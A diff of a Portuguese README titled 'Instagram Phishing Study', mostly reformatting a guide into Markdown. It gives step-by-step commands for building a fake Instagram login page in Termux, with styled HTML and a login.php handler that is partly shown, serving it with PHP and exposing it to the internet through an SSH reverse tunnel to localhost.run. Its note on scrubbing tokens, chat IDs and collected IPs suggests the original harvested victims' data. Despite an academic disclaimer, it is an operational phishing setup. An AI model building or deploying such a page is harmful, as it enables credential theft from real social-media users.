@@ -1,63 +1,102 @@
+# Instagram Phishing Study — Segurança Cibernética
 
-Instagram Phishing Study — Segurança Cibernética
-⚠️ Projeto acadêmico: desenvolvido para estudo de phishing, engenharia social e conscientização em segurança. Utilize somente em ambientes controlados e com autorização.
-Tecnologias utilizadas
-Termux
-HTML/CSS
-PHP
-SSH
-localhost.run
-1. Preparação do Termux
+⚠️ **Projeto acadêmico:** desenvolvido para estudo de phishing, engenharia social e conscientização em segurança. Utilize somente em ambientes controlados e com autorização.
+
+## Tecnologias utilizadas
+
+* Termux
+* HTML/CSS
+* PHP
+* SSH
+* localhost.run
+
+## 1. Preparação do Termux
+
+```bash id="v0jfzr"
 pkg update
 pkg upgrade
+```
+
 Instalação das ferramentas:
+
+```bash id="f95d57"
 pkg install php
 pkg install openssh
 pkg install nano
-2. Estrutura do projeto
+```
+
+## 2. Estrutura do projeto
+
+```bash id="n3a8hm"
 cd ~
 mkdir instagram-phishing-study
 cd instagram-phishing-study
+```
+
 Criação dos arquivos:
+
+```bash id="6bm2fy"
 touch index.html
 touch login.php
 touch README.md
+```
+
 Estrutura:
+
+```text id="vzmf9j"
 instagram-phishing-study/
 ├── index.html
 ├── login.php
 └── README.md
-3. Edição dos arquivos
+```
+
+## 3. Edição dos arquivos
+
 Para editar o HTML:
+
+```bash id="f36fx4"
 nano index.html
-index.html
+```
+
+### index.html
+
+```html id="1q0y97"
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Instagram</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500">
+
+  <link
+    rel="stylesheet"
+    href="https://fonts.googleapis.com/css?family=Roboto:400,500"
+  >
+
   <style>
     * {
       box-sizing: border-box;
     }
+
     body {
       background-color: #fafafa;
       font-family: 'Roboto', sans-serif;
       margin: 0;
       padding: 0;
     }
+
     .container {
       max-width: 400px;
       margin: auto;
       padding: 20px;
       text-align: center;
     }
+
     .logo {
       width: 200px;
       margin: 40px auto 20px;
     }
+
     .facebook-btn {
       background-color: #1877f2;
       color: white;
@@ -73,18 +112,29 @@ index.html
       margin-bottom: 15px;
       gap: 8px;
     }
+
     .facebook-btn svg {
       width: 16px;
       height: 16px;
-    } 
+    }
+  </style>
+</head>
+```
+
 No Nano:
-Ctrl + O — salvar
-Enter — confirmar
-Ctrl + X — sair
+
+* `Ctrl + O` — salvar
+* `Enter` — confirmar
+* `Ctrl + X` — sair
+
 Depois edite o PHP:
+
+```bash id="1my6f6"
 nano login.php
-login.php
-<?php
+```
+
+### login.php
+```<?php
 session_start();
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
@@ -122,19 +172,35 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
 }
 ?>
+```
 
 No Nano:
-Ctrl + O — salvar
-Enter — confirmar
-Ctrl + X — sair
-4. Servidor PHP local
+
+* `Ctrl + O` — salvar
+* `Enter` — confirmar
+* `Ctrl + X` — sair
+
+## 4. Servidor PHP local
+
 Execute:
+
+```bash id="j6h2z3"
 php -S 127.0.0.1:8080
+```
+
 A aplicação estará disponível localmente em:
+
+```text id="x2vy6w"
 http://127.0.0.1:8080
-5. Tunelamento utilizado no laboratório
-A atividade também estudou o conceito de SSH Reverse Port Forwarding.
+```
+
+## 5. Tunelamento utilizado no laboratório
+
+A atividade também estudou o conceito de **SSH Reverse Port Forwarding**.
+
 Fluxo:
+
+```text id="2is0lc"
 Internet
    ↓
 Serviço de tunelamento
@@ -144,32 +210,57 @@ SSH Reverse Tunnel
 localhost:8080
    ↓
 Servidor PHP
-Comando registrado durante a atividade:
-ssh -R 80:localhost:8080 nokey@localhost.run
-Funcionamento
-ssh inicia uma conexão SSH.
--R solicita encaminhamento remoto de porta.
-80 representa a porta no lado remoto.
-localhost:8080 representa o servidor executado localmente.
-localhost.run foi o serviço utilizado para estudar o funcionamento do túnel.
-O tunelamento deve ser utilizado somente para aplicações e ambientes em que exista autorização para exposição externa.
-6. Execução local
-Entre na pasta:
-cd ~/instagram-phishing-study
-Inicie o servidor:
-php -S 127.0.0.1:8080
-Para testes locais:
-http://127.0.0.1:8080
-Aviso
-Este projeto documenta conceitos estudados em ambiente acadêmico.
-As técnicas apresentadas devem ser utilizadas somente em ambientes controlados, com autorização e para fins legítimos de ensino ou pesquisa em segurança.
-Antes de publicar qualquer código, devem ser removidos:
-tokens;
-senhas;
-chaves de API;
-chat IDs;
-credenciais;
-dados pessoais;
-endereços IP coletados;
-informações de geolocalização.
+```
 
+Comando registrado durante a atividade:
+
+```bash id="y6i9ol"
+ssh -R 80:localhost:8080 nokey@localhost.run
+```
+
+### Funcionamento
+
+* `ssh` inicia uma conexão SSH.
+* `-R` solicita encaminhamento remoto de porta.
+* `80` representa a porta no lado remoto.
+* `localhost:8080` representa o servidor executado localmente.
+* `localhost.run` foi o serviço utilizado para estudar o funcionamento do túnel.
+
+> O tunelamento deve ser utilizado somente para aplicações e ambientes em que exista autorização para exposição externa.
+
+## 6. Execução local
+
+Entre na pasta:
+
+```bash id="z4msw2"
+cd ~/instagram-phishing-study
+```
+
+Inicie o servidor:
+
+```bash id="8btyas"
+php -S 127.0.0.1:8080
+```
+
+Para testes locais:
+
+```text id="cr9sbe"
+http://127.0.0.1:8080
+```
+
+## Aviso
+
+Este projeto documenta conceitos estudados em ambiente acadêmico.
+
+As técnicas apresentadas devem ser utilizadas somente em ambientes controlados, com autorização e para fins legítimos de ensino ou pesquisa em segurança.
+
+Antes de publicar qualquer código, devem ser removidos:
+
+* tokens;
+* senhas;
+* chaves de API;
+* chat IDs;
+* credenciais;
+* dados pessoais;
+* endereços IP coletados;
+* informações de geolocalização.
